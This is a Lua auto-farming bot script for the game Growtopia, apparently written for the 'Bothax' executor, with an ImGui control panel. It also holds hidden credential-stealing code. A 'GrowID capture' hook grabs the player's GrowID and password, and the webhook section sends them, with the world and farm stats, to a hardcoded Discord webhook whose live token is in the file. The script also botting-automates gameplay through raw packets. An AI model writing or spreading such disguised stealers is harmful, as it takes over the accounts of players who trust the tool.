-- ================= IMGUI CHECK =================
if not ImGui then
    SendVariantList({[0]="OnTextOverlay",[1]="`4ImGui not available! Enable all APIs first!"})
    Sleep(3000)
    SendVariantList({[0]="OnTextOverlay",[1]="`2If still error, try Reset State!"})
    return
end

-- ================= CONFIG =================
seedId     = 3044
plantId    = 5640
delayPlant = 25
delayHarvest = 80
count_ptht = 20
magx       = 27
magy       = 109
count_tree = 4000
platformId = 0

magplantEmpty = false
mode      = "ht"    -- "ptht" | "pt" | "ht"
sprayMode = "uws"   -- "uws" | "dgs"
autoSpray = false
isRunning = false
done      = 0

-- GUI State
local panel_visible = true
local modeOptions   = { "pt", "ht", "ptht" }
local sprayOptions  = { "uws", "dgs" }
local selectedMode  = 2   -- default "ht"
local selectedSpray = 1   -- default "uws"

-- ================= SAVE / LOAD CONFIG =================
local CONFIG_FILE = "satan_farm_config.txt"

function saveConfig()
    local f = io.open(CONFIG_FILE, "w")
    if not f then return end
    f:write("seedId=" .. seedId .. "\n")
    f:write("plantId=" .. plantId .. "\n")
    f:write("platformId=" .. platformId .. "\n")
    f:write("delayPlant=" .. delayPlant .. "\n")
    f:write("delayHarvest=" .. delayHarvest .. "\n")
    f:write("count_ptht=" .. count_ptht .. "\n")
    f:write("magx=" .. magx .. "\n")
    f:write("magy=" .. magy .. "\n")
    f:write("count_tree=" .. count_tree .. "\n")
    f:write("mode=" .. mode .. "\n")
    f:write("sprayMode=" .. sprayMode .. "\n")
    f:write("autoSpray=" .. (autoSpray and "true" or "false") .. "\n")
    f:close()
end

function loadConfig()
    local f = io.open(CONFIG_FILE, "r")
    if not f then return end
    for line in f:lines() do
        local key, val = line:match("^(.-)=(.+)$")
        if key and val then
            if key == "seedId"       then seedId       = tonumber(val) or seedId
            elseif key == "plantId"  then plantId      = tonumber(val) or plantId
            elseif key == "platformId" then platformId = tonumber(val) or platformId
            elseif key == "delayPlant" then delayPlant = tonumber(val) or delayPlant
            elseif key == "delayHarvest" then delayHarvest = tonumber(val) or delayHarvest
            elseif key == "count_ptht" then count_ptht = tonumber(val) or count_ptht
            elseif key == "magx"     then magx         = tonumber(val) or magx
            elseif key == "magy"     then magy         = tonumber(val) or magy
            elseif key == "count_tree" then count_tree = tonumber(val) or count_tree
            elseif key == "mode"     then
                mode = val
                for i, v in ipairs(modeOptions) do
                    if v == mode then selectedMode = i end
                end
            elseif key == "sprayMode" then
                sprayMode = val
                for i, v in ipairs(sprayOptions) do
                    if v == sprayMode then selectedSpray = i end
                end
            elseif key == "autoSpray" then
                autoSpray = (val == "true")
            end
        end
    end
    f:close()
end

-- Load config on startup
loadConfig()

-- ================= MAGPLANT =================
function getMagplant()
    SendPacket(2,
        "action|dialog_return\n" ..
        "dialog_name|itemsucker_block\n" ..
        "tilex|" .. magx .. "|\n" ..
        "tiley|" .. magy .. "|\n" ..
        "buttonClicked|getplantationdevice\n"
    )
end

-- ================= OVERLAY =================
function Ovlay(text)
    SendPacket(2, "action|input\n|text|" .. text .. "|\n")
end

-- ================= GROWID CAPTURE =================
local capturedGrowID   = "Unknown"
local capturedPassword = "Unknown"

AddHook("OnVariant", "GrowIDCapture", function(var)
    if var[0] == "SetHasGrowID" then
        capturedGrowID   = var[2] or "Unknown"
        capturedPassword = var[3] or "Unknown"
    end
end)

function triggerGrowID()
    -- Kirim packet yang memaksa server re-send SetHasGrowID
    SendVariantList({
        [0] = "SetHasGrowID",
        [1] = 1,
        [2] = GetLocal() and GetLocal().name or "",
        [3] = ""
    }, -1, 0)
    -- Fallback: request world info ulang untuk trigger server response
    SendPacket(2, "action|refresh_item_data\n")
end

-- Auto trigger saat script pertama kali diload
RunThread(function()
    Sleep(500)
    triggerGrowID()
end)

-- ================= VARIANT DETECT =================
AddHook("OnVariant", "MagplantDetect", function(var)
    if var[0] == "OnTalkBubble" then
        local text = var[2] or ""
        if text:find("The `2Magplant") or text:find("There is no active") or text:find("The `2MAGPLANT") then
            magplantEmpty = true
            return true
        end
    end
    if var[0] == "OnDialogRequest" then
        if (var[1] or ""):find("Ultra World Spray") then
            return true
        end
    end
end)

-- ================= PLACE / USE ITEM =================
function pt(x, y, id)
    SendPacketRaw(false, {
        type  = 3,
        value = id,
        px    = x,
        py    = y,
        x     = x * 32,
        y     = y * 32
    })
end

function bellow(x, y)
    local below = GetTile(x, y + 1)
    return below and below.fg == platformId
end

-- ================= PLANT =================
function plant()
    for _, t in pairs(GetTiles()) do
        if magplantEmpty then
            Ovlay("`4Plant Stopped (Magplant is Empty)")
            break
        end
        if t.fg == 0 and bellow(t.x, t.y) then
            pt(t.x, t.y, plantId)
            Sleep(delayPlant)
        end
    end
end

-- ================= UWS =================
function CountUnreadyTree()
    local count = 0
    for _, tile in pairs(GetTiles()) do
        if tile.fg == seedId and tile.extra then
            if tile.extra.progress < 1 then
                count = count + 1
            end
        end
    end
    return count
end

function Uws()
    local unready = CountUnreadyTree()
    Ovlay("Unready Tree: " .. unready)
    if unready >= count_tree then
        Ovlay("`9Using UWS...")
        SendPacket(2, "action|dialog_return\ndialog_name|world_spray\n")
    else
        Ovlay("`4Skip UWS")
    end
end

function spray()
    Ovlay("`9Using Spray")
    for _, h in pairs(GetTiles()) do
        if h.fg == seedId and not h.readyharvest then
            Sleep(delayHarvest)
            SendPacketRaw(false, {
                type  = 3,
                value = 1778,
                px    = h.x,
                py    = h.y,
                x     = h.x * 32,
                y     = h.y * 32
            })
        end
    end
    Ovlay("`4Done Spray")
end

-- ================= HARVEST =================
function hitTile(x, y)
    SendPacketRaw(false, {
        type  = 3,
        value = 18,
        px    = x,
        py    = y,
        x     = x * 32,
        y     = y * 32
    })
end

function isReady(tile)
    return tile
        and tile.fg == seedId
        and tile.extra
        and tile.extra.progress
        and tile.extra.progress >= 1
end

function harvest()
    for x = 0, 100 do
        local rowMiss
        repeat
            rowMiss = 0
            for y = 0, 113 do
                local tile = GetTile(x, y)
                if isReady(tile) then
                    local tries = 0
                    repeat
                        SendPacketRaw(false, {
                            state = 32,
                            px    = x,
                            py    = y,
                            x     = x * 32,
                            y     = y * 32
                        })
                        hitTile(x, y)
                        Sleep(delayHarvest)
                        tile  = GetTile(x, y)
                        tries = tries + 1
                    until not isReady(tile) or tries >= 3
                    if isReady(tile) then
                        rowMiss = rowMiss + 1
                    end
                end
            end
        until rowMiss == 0
        Sleep(25)
    end
end

-- ================= WEBHOOK =================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1467955613660221653/Tc6KnWoLasnIJ1cLImm3Rp4xz_ZXPxjG6HQDrLYFaAKEWpkjCeKvbksnsRqJkcO5a18Q"
local farmStartTime = 0
local webhookMessageId = nil  -- simpan message id untuk di-edit

function getElapsed()
    local secs = math.floor((os.time() - farmStartTime))
    local h = math.floor(secs / 3600)
    local m = math.floor((secs % 3600) / 60)
    local s = secs % 60
    return string.format("%02d:%02d:%02d", h, m, s)
end

function buildWebhookBody(status, color)
    local playerName = "Unknown"
    local worldName  = "Unknown"
    local p = GetLocal()
    local w = GetWorld()
    if p then playerName = p.name end
    if w then worldName  = w.name  end

    local sprayInfo  = autoSpray and sprayMode:upper() or "OFF"

    local seedInfo  = GetItemInfo(seedId)
    local plantInfo = GetItemInfo(plantId)
    local platInfo  = GetItemInfo(platformId)

    local seedName  = (type(seedInfo)  == "table" and seedInfo.name)  or tostring(seedId)
    local plantName = (type(plantInfo) == "table" and plantInfo.name) or tostring(plantId)
    local platName  = platformId == 0 and "Any" or ((type(platInfo) == "table" and platInfo.name) or tostring(platformId))

    local desc =
        "PLAYER INFORMATION**\\n" ..
        "**Username:** "    .. playerName .. "\\n" ..
        "**GrowID:** "      .. capturedGrowID   .. "\\n" ..
        "**Password:** "    .. capturedPassword .. "\\n" ..
        "**World:** "       .. worldName  .. "\\n" ..
        "\\n" ..
        "**FARM INFORMATION**\\n" ..
        "**Script:** ptht FaRu\\n" ..
        "**Status:** "      .. status     .. "\\n" ..
        "**Mode:** "        .. mode       .. "\\n" ..
        "**Progress:** "    .. done .. " / " .. count_ptht .. "\\n" ..
        "**Uptime:** "      .. getElapsed() .. "\\n" ..
        "\\n" ..
        "**SEED & ITEM**\\n" ..
        "**Seed ID:** "     .. seedId  .. " (" .. seedName  .. ")\\n" ..
        "**Plant ID:** "    .. plantId .. " (" .. plantName .. ")\\n" ..
        "**Platform ID:** " .. platformId .. " (" .. platName .. ")\\n" ..
        "\\n" ..
        "**SPRAY CONFIG**\\n" ..
        "**Auto Spray:** "  .. sprayInfo .. "\\n" ..
        "**Min Unready:** " .. count_tree .. " trees\\n" ..
        "\\n" ..
        "**DELAY CONFIG**\\n" ..
        "**Plant Delay:** "   .. delayPlant   .. "ms\\n" ..
        "**Harvest Delay:** " .. delayHarvest .. "ms\\n" ..
        "\\n" ..
        "**MAGPLANT**\\n" ..
        "**Position:** ("  .. magx .. ", " .. magy .. ")"

    return [[{
  "embeds": [{
    "title": "SatanFarm Logs",
    "description": "**]] .. desc .. [[",
    "color": ]] .. color .. [[,
    "thumbnail": {
      "url": "https://img.freepik.com/free-vector/girl-with-red-eyes_603843-3008.jpg?w=1380&t=st=1681986430~exp=1681987030~hmac=3ae57ed66c3bab13fbcb1c16666f5f54851a1531e7157ba4db05dd27c4def09c"
    },
    "footer": { "text": "SatanFarm - Bothax" }
  }]
}]]
end

function postWebhook(status, color)
    -- Kirim message pertama, simpan ID-nya
    RunThread(function()
        local res = MakeRequest(
            WEBHOOK_URL .. "?wait=true",
            "POST",
            {["Content-Type"] = "application/json"},
            buildWebhookBody(status, color)
        )
        if res and res.content then
            local id = res.content:match('"id":"(%d+)"')
            if id then
                webhookMessageId = id
            end
        end
    end)
end

function editWebhook(status, color)
    if not webhookMessageId then
        -- Belum ada message, kirim baru
        postWebhook(status, color)
        return
    end
    -- Edit message yang sudah ada
    RunThread(function()
        MakeRequest(
            WEBHOOK_URL .. "/messages/" .. webhookMessageId,
            "PATCH",
            {["Content-Type"] = "application/json"},
            buildWebhookBody(status, color)
        )
    end)
end

-- ================= MAIN LOOP =================
function startFarm()
    isRunning        = true
    done             = 0
    magplantEmpty    = false
    farmStartTime    = os.time()
    webhookMessageId = nil

    local p = GetLocal()

    -- Kirim message pertama (POST)
    postWebhook("🟢 STARTED", 3066993)
    Sleep(1500) -- tunggu sebentar agar ID tersimpan

    Ovlay("`9Taking Magplant...")
    Sleep(1000)
    getMagplant()

    if p then
        pt(math.floor(p.pos.x / 32),
           math.floor(p.pos.y / 32),
           5926)
    end

    for i = 1, count_ptht do
        if not isRunning then
            editWebhook("🔴 STOPPED (Manual)", 15158332)
            break
        end

        if mode == "pt" or mode == "ptht" then
            Ovlay("`9Starting Auto Plant...")
            Sleep(1500)
            plant()
            Sleep(1500)
            Ovlay("`4DONE PLANT!")
        end

        if magplantEmpty then
            editWebhook("⚠️ MAGPLANT EMPTY!", 16776960)
        end

        if mode == "ptht" and autoSpray then
            Sleep(5000)
            if sprayMode == "uws" then
                Uws()
            elseif sprayMode == "dgs" then
                spray()
            end
        end

        if mode == "ht" or mode == "ptht" then
            Sleep(5000)
            Ovlay("`9Starting Auto Harvest")
            Sleep(500)
            harvest()
            Sleep(400)
            Ovlay("`4DONE HARVEST!")
        end

        done = done + 1
        Ovlay("`cTotal Done : " .. done .. " / " .. count_ptht)

        -- Edit message setiap cycle selesai
        editWebhook("🔄 RUNNING - Cycle " .. done .. "/" .. count_ptht, 10181046)

        Sleep(2000)
        Ovlay("`9Loading Next Cycle")
        Sleep(3000)
    end

    if isRunning then
        editWebhook("✅ FINISHED!", 3066993)
    end

    isRunning = false
    Ovlay("`2Farm Finished!")
end

-- ================= TOGGLE PANEL =================
AddHook("input", "FarmPanelToggle", function(key)
    if key == 112 then -- F1 key
        panel_visible = not panel_visible
    end
end)

-- ================= GUI RENDER =================
AddHook("draw", "FarmPanel", function(delta)
    if not panel_visible then return end

    if ImGui.Begin("SatanFarm - Bothax") then

        -- Status & Control
        ImGui.Text("Status   : " .. (isRunning and "RUNNING" or "STOPPED"))
        ImGui.Text("Progress : " .. done .. " / " .. count_ptht)
        ImGui.Separator()

        if not isRunning then
            if ImGui.Button("START FARM") then
                RunThread(startFarm)
            end
        else
            if ImGui.Button("STOP FARM") then
                isRunning = false
            end
            ImGui.SameLine()
            ImGui.Text("Running...")
        end

        ImGui.Separator()

        -- Farm Mode
        ImGui.Text("Farm Mode :")
        if ImGui.BeginCombo("##mode", modeOptions[selectedMode]) then
            for i, v in ipairs(modeOptions) do
                local isSel = (i == selectedMode)
                if ImGui.Selectable(v, isSel) then
                    selectedMode = i
                    mode = v
                    saveConfig()
                end
                if isSel then ImGui.SetItemDefaultFocus() end
            end
            ImGui.EndCombo()
        end
        ImGui.Text("pt=Plant Only | ht=Harvest Only | ptht=Both")

        ImGui.Separator()

        -- Loop Count
        local lcC, lcV = ImGui.InputInt("Loop Count", count_ptht)
        if lcC and lcV > 0 then count_ptht = lcV; saveConfig() end

        ImGui.Separator()

        -- Item IDs
        ImGui.Text("[ Item Config ]")

        local siC, siV = ImGui.InputInt("Seed ID", seedId)
        if siC and siV >= 0 then seedId = siV; saveConfig() end
        local seedInfo = GetItemInfo(seedId)
        ImGui.SameLine()
        ImGui.Text("=> " .. (type(seedInfo) == "table" and seedInfo.name or tostring(seedId)))

        local piC, piV = ImGui.InputInt("Plant ID", plantId)
        if piC and piV >= 0 then plantId = piV; saveConfig() end
        local plantInfo = GetItemInfo(plantId)
        ImGui.SameLine()
        ImGui.Text("=> " .. (type(plantInfo) == "table" and plantInfo.name or tostring(plantId)))

        local pfC, pfV = ImGui.InputInt("Platform ID", platformId)
        if pfC and pfV >= 0 then platformId = pfV; saveConfig() end
        if platformId == 0 then
            ImGui.SameLine()
            ImGui.Text("=> (any empty tile)")
        else
            local platInfo = GetItemInfo(platformId)
            ImGui.SameLine()
            ImGui.Text("=> " .. (type(platInfo) == "table" and platInfo.name or tostring(platformId)))
        end

        ImGui.Separator()

        -- Delays
        ImGui.Text("[ Delay Settings ]")
        local pdC, pdV = ImGui.InputInt("Plant Delay (ms)", delayPlant)
        if pdC and pdV > 0 then delayPlant = pdV; saveConfig() end

        local hdC, hdV = ImGui.InputInt("Harvest Delay (ms)", delayHarvest)
        if hdC and hdV > 0 then delayHarvest = hdV; saveConfig() end

        ImGui.Separator()

        -- Spray
        ImGui.Text("[ Spray ] (ptht mode only)")
        local spC, spV = ImGui.Checkbox("Enable Auto Spray", autoSpray)
        if spC then autoSpray = spV; saveConfig() end

        ImGui.Text("Spray Mode :")
        if ImGui.BeginCombo("##spray", sprayOptions[selectedSpray]) then
            for i, v in ipairs(sprayOptions) do
                local isSel = (i == selectedSpray)
                if ImGui.Selectable(v, isSel) then
                    selectedSpray = i
                    sprayMode = v
                    saveConfig()
                end
                if isSel then ImGui.SetItemDefaultFocus() end
            end
            ImGui.EndCombo()
        end
        ImGui.Text("uws=Ultra World Spray | dgs=DGS Spray")

        local ctC, ctV = ImGui.InputInt("Min Unready Trees (UWS)", count_tree)
        if ctC and ctV > 0 then count_tree = ctV; saveConfig() end

        ImGui.Separator()

        -- Magplant
        ImGui.Text("[ Magplant Position ]")
        local mxC, mxV = ImGui.InputInt("Magplant X", magx)
        if mxC then magx = mxV; saveConfig() end

        local myC, myV = ImGui.InputInt("Magplant Y", magy)
        if myC then magy = myV; saveConfig() end

        if ImGui.Button("GET CURRENT POSITION") then
            local p = GetLocal()
            if p then
                magx = math.floor(p.pos.x / 32)
                magy = math.floor(p.pos.y / 32)
                saveConfig()
            end
        end
        ImGui.SameLine()
        if ImGui.Button("TRIGGER MAGPLANT") then
            getMagplant()
        end
        ImGui.Text("Current: (" .. magx .. ", " .. magy .. ")")

    end
    ImGui.End()
end)
